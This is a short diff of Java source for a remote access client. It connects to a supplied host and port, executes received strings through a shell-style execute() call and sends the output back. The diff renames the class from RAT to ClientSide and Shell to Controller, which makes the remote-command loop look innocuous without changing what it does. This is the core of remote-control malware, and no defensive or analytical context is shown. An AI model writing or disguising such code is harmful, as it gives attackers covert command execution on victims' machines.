@@ -5,9 +5,9 @@ import java.io.DataOutputStream;
 import java.io.IOException;
 import java.net.Socket;
 
-import control.Shell;
+import control.Controller;
 
-public class RAT {
+public class ClientSide {
 	private Socket s;
 	
 	private DataOutputStream dout;
@@ -16,7 +16,7 @@ public class RAT {
 	private String _ip;
 	private int _port;
 	
-	public RAT(String hostIP, int port) {
+	public ClientSide(String hostIP, int port) {
 		_ip = hostIP;
 		_port = port;
 	}
@@ -40,7 +40,7 @@ public class RAT {
 					return;
 				}
 				else {
-					dout.writeUTF(Shell.execute(received));
+					dout.writeUTF(Controller.execute(received));
 					dout.flush();
 				}
 	        } catch (Exception e1) {
